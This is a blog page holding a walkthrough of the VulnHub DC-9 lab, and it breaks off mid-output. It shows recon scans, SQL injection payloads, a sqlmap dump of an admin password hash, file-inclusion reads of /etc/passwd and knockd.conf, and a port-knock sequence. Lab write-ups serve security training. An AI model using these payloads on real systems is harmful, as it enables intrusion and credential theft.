@@ -1,0 +1,607 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="vulnhub_DC_9In this article, I’m going to crack the DC-9 box of DC series in vulnhub. portscan: 123456789101112131415┌──(root㉿kali)-[~&#x2F;Desktop]└─# nmap -sC -sV 192.168.122.20 Starting Nmap 7.94 ( http">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnhub_DC_9">
+<meta property="og:url" content="http://example.com/2024/07/23/vulnhub_DC_9/index.html">
+<meta property="og:site_name" content="Ry4nnnn">
+<meta property="og:description" content="vulnhub_DC_9In this article, I’m going to crack the DC-9 box of DC series in vulnhub. portscan: 123456789101112131415┌──(root㉿kali)-[~&#x2F;Desktop]└─# nmap -sC -sV 192.168.122.20 Starting Nmap 7.94 ( http">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/image-20231114103757119.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/image-20231114104151851.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/image-20231114104712219.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/image-20231114104840433.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/image-20231114110420113.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/image-20231114111547238.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/image-20231114112125136.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/image-20231114114012641.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/image-20231114115006218.png">
+<meta property="og:image" content="http://example.com/2023/04/27/file-upload/image-20231114115744136.png">
+<meta property="article:published_time" content="2024-07-23T04:00:00.000Z">
+<meta property="article:modified_time" content="2024-07-23T06:41:09.312Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="vulnhub">
+<meta property="article:tag" content="walkthrough">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2023/04/27/file-upload/image-20231114103757119.png">
+  
+  
+  <title>vulnhub_DC_9 - Ry4nnnn</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.13","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"MgDyY5XEdtIKIZHTxzy3GBJV-gzGzoHsz","app_key":"P8Ab9EN1clJmhpYHpamFEiD9","server_url":"https://mgdyy5xe.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Ry4nnnn&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/moon.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="vulnhub_DC_9">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2024-07-23 12:00" pubdate>
+        2024年7月23日 中午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      16k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      134 分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- LeanCloud 统计文章PV -->
+      <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="leancloud-page-views"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">vulnhub_DC_9</h1>
+            
+            <div class="markdown-body">
+              <h1 id="vulnhub-DC-9"><a href="#vulnhub-DC-9" class="headerlink" title="vulnhub_DC_9"></a>vulnhub_DC_9</h1><p>In this article, I’m going to crack the DC-9 box of DC series in vulnhub.</p>
+<p>portscan:</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">┌──(root㉿kali)-[~/Desktop]<br>└─<span class="hljs-comment"># nmap -sC -sV 192.168.122.20 </span><br>Starting Nmap <span class="hljs-number">7.94</span> ( <span class="hljs-keyword">https</span>://nmap.org ) <span class="hljs-keyword">at</span> <span class="hljs-number">2023</span><span class="hljs-number">-11</span><span class="hljs-number">-13</span> <span class="hljs-number">20</span>:<span class="hljs-number">41</span> EST<br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">192.168</span><span class="hljs-number">.122</span><span class="hljs-number">.20</span><br>Host is up (<span class="hljs-number">0.00029</span>s latency).<br>Not shown: <span class="hljs-number">998</span> closed tcp ports (reset)<br>PORT   STATE    SERVICE VERSION<br><span class="hljs-number">22</span>/tcp filtered ssh<br><span class="hljs-number">80</span>/tcp <span class="hljs-built_in">open</span>     <span class="hljs-keyword">http</span>    Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.38</span> ((Debian))<br>|<span class="hljs-title">_http-server-header</span>: Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.38</span> (Debian)<br>|<span class="hljs-title">_http-title</span>: Example.com - Staff Details - Welcome<br>MAC Address: <span class="hljs-number">00</span>:<span class="hljs-number">0</span>C:<span class="hljs-number">29</span>:<span class="hljs-number">04</span>:A2:<span class="hljs-number">19</span> (VMware)<br><br>Service detection performed. Please report <span class="hljs-keyword">any</span> incorrect results <span class="hljs-keyword">at</span> <span class="hljs-keyword">https</span>://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">7.63</span> <span class="hljs-built_in">seconds</span><br></code></pre></td></tr></table></figure>
+
+<p>It seems that only port 80 is open. Port 22 is filtered, let’s put it on hold for now.</p>
+<p>When it comes to port 80, I will make an attempt to dirsearch and nikto subconsciously.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~/Desktop]<br>└─# dirsearch -u http://192.168.122.20<br><br>  _|. _ _  _  _  _ _|_    v0.4.2                                                                                                                                                                                  <br> (_||| _) (/_(_|| (_| )                                                                                                                                                                                           <br>                                                                                                                                                                                                                  <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/192.168.122.20/_23-11-13_20-48-30.txt<br><br>Error Log: /root/.dirsearch/logs/errors-23-11-13_20-48-30.<span class="hljs-built_in">log</span><br><br>Target: http://192.168.122.20/<br><br>[20:48:30] Starting: <br>[20:48:32] 403 -  279B  - /.ht_wsr.txt                                     <br>[20:48:32] 403 -  279B  - /.htaccess.save                                  <br>[20:48:32] 403 -  279B  - /.htaccess.bak1<br>[20:48:32] 403 -  279B  - /.htaccess.sample<br>[20:48:32] 403 -  279B  - /.htaccess_sc<br>[20:48:32] 403 -  279B  - /.htaccess.orig<br>[20:48:32] 403 -  279B  - /.htaccess_orig<br>[20:48:32] 403 -  279B  - /.htaccess_extra<br>[20:48:32] 403 -  279B  - /.htaccessBAK<br>[20:48:32] 403 -  279B  - /.htaccessOLD                                    <br>[20:48:32] 403 -  279B  - /.htaccessOLD2<br>[20:48:32] 403 -  279B  - /.htm<br>[20:48:33] 403 -  279B  - /.html<br>[20:48:33] 403 -  279B  - /.htpasswd_test<br>[20:48:33] 403 -  279B  - /.httr-oauth                                     <br>[20:48:33] 403 -  279B  - /.htpasswds                                      <br>[20:48:34] 403 -  279B  - /.php                                            <br>[20:48:55] 200 -    0B  - /config.php                                       <br>[20:48:56] 301 -  314B  - /css  -&gt;  http://192.168.122.20/css/              <br>[20:48:58] 200 -    3KB - /display.php                                      <br>[20:49:04] 200 -  747B  - /includes/                                        <br>[20:49:04] 301 -  319B  - /includes  -&gt;  http://192.168.122.20/includes/    <br>[20:49:04] 200 -  917B  - /index.php                                        <br>[20:49:04] 200 -  917B  - /index.php/login/                                 <br>[20:49:08] 302 -    0B  - /logout.php  -&gt;  manage.php                       <br>[20:49:08] 200 -    1KB - /manage.php                                       <br>[20:49:20] 200 -    1KB - /search.php                                       <br>[20:49:20] 403 -  279B  - /server-status                                    <br>[20:49:20] 403 -  279B  - /server-status/                                   <br>┌──(root㉿kali)-[~]<br>└─# nikto -h 192.168.122.20   <br>- Nikto v2.5.0<br>---------------------------------------------------------------------------<br>+ Target IP:          192.168.122.20<br>+ Target Hostname:    192.168.122.20<br>+ Target Port:        80<br>+ Start Time:         2023-11-13 20:48:36 (GMT-5)<br>---------------------------------------------------------------------------<br>+ Server: Apache/2.4.38 (Debian)<br>+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options<br>+ /: The X-Content-Type-Options header is not <span class="hljs-built_in">set</span>. This could allow the user agent to render the content of the site <span class="hljs-keyword">in</span> a different fashion to the MIME <span class="hljs-built_in">type</span>. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/<br>+ No CGI Directories found (use <span class="hljs-string">&#x27;-C all&#x27;</span> to force check all possible <span class="hljs-built_in">dirs</span>)<br>+ Apache/2.4.38 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL <span class="hljs-keyword">for</span> the 2.x branch.<br>+ /: Web Server returns a valid response with junk HTTP methods <span class="hljs-built_in">which</span> may cause <span class="hljs-literal">false</span> positives.<br>+ /config.php: PHP Config file may contain database IDs and passwords.<br>+ /css/: Directory indexing found.<br>+ /css/: This might be interesting.<br>+ /includes/: Directory indexing found.<br>+ /includes/: This might be interesting.<br>+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/<br>+ 8102 requests: 0 error(s) and 10 item(s) reported on remote host<br>+ End Time:           2023-11-13 20:49:08 (GMT-5) (32 seconds)<br>---------------------------------------------------------------------------<br>+ 1 host(s) tested<br></code></pre></td></tr></table></figure>
+
+<p>The size of the config.php page is 0B, where an arbitrary file read vulnerability may be needed to obtain certain configuration information.</p>
+<p>Here are also some 200-code pages, let’s check them out using firefox.</p>
+<p><img src="/2023/04/27/file-upload/image-20231114103757119.png" srcset="/img/loading.gif" lazyload alt="image-20231114103757119"></p>
+<p>Brute force, SQLI — failed.</p>
+<p>Display.php shows all user information and search.php privodes a input form for specific seaerching.</p>
+<p><img src="/2023/04/27/file-upload/image-20231114104151851.png" srcset="/img/loading.gif" lazyload alt="image-20231114104151851"></p>
+<p><img src="/2023/04/27/file-upload/image-20231114104712219.png" srcset="/img/loading.gif" lazyload alt="image-20231114104712219"></p>
+<p>It displayed correct result when I input mary, however when I tried <code>0&#39; or 1=1 #</code> it responsed with whole info!</p>
+<p><img src="/2023/04/27/file-upload/image-20231114104840433.png" srcset="/img/loading.gif" lazyload alt="image-20231114104840433"></p>
+<p>SQLMAP GO!</p>
+<figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs inform7">┌──(root㉿kali)-<span class="hljs-comment">[~/Desktop/vulnhub/DC-9]</span><br>└─# sqlmap -r DC9 --random-agent --dbms=mysql -D Staff -T Users -C Username,Password --dump      <br>        ___<br>       __H__                                                                                                                                                                                                      <br> ___ ___<span class="hljs-comment">[&quot;]</span>_____ ___ ___  &#123;1.7.8#stable&#125;                                                                                                                                                                          <br>|_ -| . <span class="hljs-comment">[&#x27;]</span>     | .&#x27;| . |                                                                                                                                                                                         <br>|___|_  <span class="hljs-comment">[.]</span>_|_|_|__,|  _|                                                                                                                                                                                         <br>      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                      <br><br><span class="hljs-comment">[!]</span> legal disclaimer: Usage <span class="hljs-keyword">of</span> sqlmap for attacking targets without prior mutual consent <span class="hljs-keyword">is</span> illegal. It <span class="hljs-keyword">is</span> the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and <span class="hljs-keyword">are</span> not responsible for any misuse or damage caused by this program<br><br><span class="hljs-comment">[*]</span> starting @ 21:58:47 /2023-11-13/<br><br><span class="hljs-comment">[21:58:47]</span> <span class="hljs-comment">[INFO]</span> parsing HTTP request from &#x27;DC9&#x27;<br><span class="hljs-comment">[21:58:47]</span> <span class="hljs-comment">[INFO]</span> fetched random HTTP User-Agent header value &#x27;Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-gb) AppleWebKit/525.18.1 (KHTML, like Gecko) Version/3.1.2 Safari/525.20.1&#x27; from file &#x27;/usr/share/sqlmap/data/txt/user-agents.txt&#x27;                                                                                                                                                                              <br><span class="hljs-comment">[21:58:47]</span> <span class="hljs-comment">[INFO]</span> testing connection to the target URL<br><span class="hljs-comment">[21:58:47]</span> <span class="hljs-comment">[INFO]</span> checking if the target <span class="hljs-keyword">is</span> protected by some <span class="hljs-keyword">kind</span> <span class="hljs-keyword">of</span> WAF/IPS<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[INFO]</span> testing if the target URL content <span class="hljs-keyword">is</span> stable<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[INFO]</span> target URL content <span class="hljs-keyword">is</span> stable<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[INFO]</span> testing if POST parameter &#x27;search&#x27; <span class="hljs-keyword">is</span> dynamic<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[WARNING]</span> POST parameter &#x27;search&#x27; does not appear to be dynamic<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[WARNING]</span> heuristic (basic) test shows that POST parameter &#x27;search&#x27; might not be injectable<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[INFO]</span> testing for SQL injection on POST parameter &#x27;search&#x27;<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[INFO]</span> testing &#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[INFO]</span> testing &#x27;Boolean-based blind - Parameter replace (original value)&#x27;<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[INFO]</span> testing &#x27;Generic inline queries&#x27;<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[INFO]</span> testing &#x27;MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&#x27;<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[INFO]</span> testing &#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27;<br><span class="hljs-comment">[21:58:48]</span> <span class="hljs-comment">[WARNING]</span> time-based comparison requires larger statistical model, please wait............... (done)                                                                                                  <br><span class="hljs-comment">[21:59:08]</span> <span class="hljs-comment">[INFO]</span> POST parameter &#x27;search&#x27; appears to be &#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27; injectable <br>for the remaining tests, do you want to include all tests for &#x27;MySQL&#x27; extending provided level (1) and risk (1) values? <span class="hljs-comment">[Y/n]</span> y<br><span class="hljs-comment">[21:59:18]</span> <span class="hljs-comment">[INFO]</span> testing &#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27;<br><span class="hljs-comment">[21:59:18]</span> <span class="hljs-comment">[INFO]</span> automatically extending ranges for UNION query injection technique tests as there <span class="hljs-keyword">is</span> at least one other (potential) technique found<br><span class="hljs-comment">[21:59:18]</span> <span class="hljs-comment">[INFO]</span> target URL appears to be UNION injectable with 6 columns<br><span class="hljs-comment">[21:59:18]</span> <span class="hljs-comment">[INFO]</span> POST parameter &#x27;search&#x27; <span class="hljs-keyword">is</span> &#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27; injectable<br>POST parameter &#x27;search&#x27; <span class="hljs-keyword">is</span> vulnerable. Do you want to keep testing the others (if any)? <span class="hljs-comment">[y/N]</span> y<br>sqlmap identified the following injection point(s) with a total <span class="hljs-keyword">of</span> 59 HTTP(s) requests:<br>---<br>Parameter: search (POST)<br>    Type: time-based blind<br>    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)<br>    Payload: search=1&#x27; AND (SELECT 9453 FROM (SELECT(SLEEP(5)))KFpZ) AND &#x27;pTLE&#x27;=&#x27;pTLE<br><br>    Type: UNION query<br>    Title: Generic UNION query (NULL) - 6 columns<br>    Payload: search=1&#x27; UNION ALL SELECT NULL,CONCAT(0x7170716271,0x50787558766b6c786b7663596d6f6b6f4d455975546751527162447053714a504b52776368594e6e,0x716a787171),NULL,NULL,NULL,NULL-- -<br>---<br><span class="hljs-comment">[21:59:19]</span> <span class="hljs-comment">[INFO]</span> the back-end DBMS <span class="hljs-keyword">is</span> MySQL<br>web server operating system: Linux Debian 10 (buster)<br>web application technology: Apache 2.4.38<br>back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)<br><span class="hljs-comment">[21:59:19]</span> <span class="hljs-comment">[INFO]</span> fetching entries <span class="hljs-keyword">of</span> column(s) &#x27;Password,Username&#x27; for table &#x27;Users&#x27; in database &#x27;Staff&#x27;<br><span class="hljs-comment">[21:59:19]</span> <span class="hljs-comment">[INFO]</span> recognized possible password hashes in column &#x27;Password&#x27;<br>do you want to store hashes to a temporary file for eventual further processing with other tools <span class="hljs-comment">[y/N]</span> y<br><span class="hljs-comment">[21:59:21]</span> <span class="hljs-comment">[INFO]</span> writing hashes to a temporary file &#x27;/tmp/sqlmapnlg9g_9g406618/sqlmaphashes-__m2zybn.txt&#x27; <br>do you want to crack them via a dictionary-based attack? <span class="hljs-comment">[Y/n/q]</span> y<br><span class="hljs-comment">[21:59:21]</span> <span class="hljs-comment">[INFO]</span> using hash method &#x27;md5_generic_passwd&#x27;<br>what dictionary do you want to use?<br><span class="hljs-comment">[1]</span> default dictionary file &#x27;/usr/share/sqlmap/data/txt/wordlist.tx_&#x27; (press Enter)<br><span class="hljs-comment">[2]</span> custom dictionary file<br><span class="hljs-comment">[3]</span> file with list <span class="hljs-keyword">of</span> dictionary files<br>&gt; y<br><span class="hljs-comment">[21:59:22]</span> <span class="hljs-comment">[INFO]</span> using default dictionary<br>do you want to use common password suffixes? (slow!) <span class="hljs-comment">[y/N]</span> <br><span class="hljs-comment">[21:59:23]</span> <span class="hljs-comment">[INFO]</span> starting dictionary-based cracking (md5_generic_passwd)<br><span class="hljs-comment">[21:59:23]</span> <span class="hljs-comment">[INFO]</span> starting 4 processes <br><span class="hljs-comment">[21:59:39]</span> <span class="hljs-comment">[WARNING]</span> no clear password(s) found                                                                                                                                                                  <br>Database: Staff<br><span class="hljs-section">Table: Users</span><br><span class="hljs-comment">[1 entry]</span><br>+----------+----------------------------------+<br>| Username | Password                         |<br>+----------+----------------------------------+<br>| admin    | 856f5de590ef37314e7c3bdf6f8a66dc |<br>+----------+----------------------------------+<br><br><span class="hljs-comment">[21:59:39]</span> <span class="hljs-comment">[INFO]</span> table &#x27;Staff.Users&#x27; dumped to CSV file &#x27;/root/.local/share/sqlmap/output/192.168.122.20/dump/Staff/Users.csv&#x27;<br><span class="hljs-comment">[21:59:39]</span> <span class="hljs-comment">[INFO]</span> fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/192.168.122.20&#x27;<br><br><span class="hljs-comment">[*]</span> ending @ 21:59:39 /2023-11-13/<br></code></pre></td></tr></table></figure>
+
+<p>856f5de590ef37314e7c3bdf6f8a66dc — md5 decrypt: transorbital1</p>
+<p>Login using admin account:</p>
+<p><img src="/2023/04/27/file-upload/image-20231114110420113.png" srcset="/img/loading.gif" lazyload alt="image-20231114110420113"></p>
+<p>“FILE DOES NOT EXIST” — It indicates that welcome.php page may have a param. </p>
+<p>Maybe file? Let’s check it.</p>
+<p><img src="/2023/04/27/file-upload/image-20231114111547238.png" srcset="/img/loading.gif" lazyload alt="image-20231114111547238"></p>
+<p>We can successfully access &#x2F;etc&#x2F;passwd through file param.</p>
+<p>Do you remember that port 22 is filtered? It is possible that knock tool is utilized for port hidden.</p>
+<p>Try to access knockd.conf file with vul mentioned above:</p>
+<p><img src="/2023/04/27/file-upload/image-20231114112125136.png" srcset="/img/loading.gif" lazyload alt="image-20231114112125136"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs awk">──(root㉿kali)-[<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>wfuzz]<br>└─<span class="hljs-comment"># knock 192.168.122.20 7469:tcp 8475:tcp 9842:tcp</span><br>                                                                                                                                                                                                                  <br>┌──(root㉿kali)-[<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>wfuzz]<br>└─<span class="hljs-comment"># nmap -p 22 192.168.122.20 </span><br>Starting Nmap <span class="hljs-number">7.94</span> ( https:<span class="hljs-regexp">//</span>nmap.org ) at <span class="hljs-number">2023</span>-<span class="hljs-number">11</span>-<span class="hljs-number">13</span> <span class="hljs-number">22</span>:<span class="hljs-number">24</span> EST<br>Nmap scan report <span class="hljs-keyword">for</span> <span 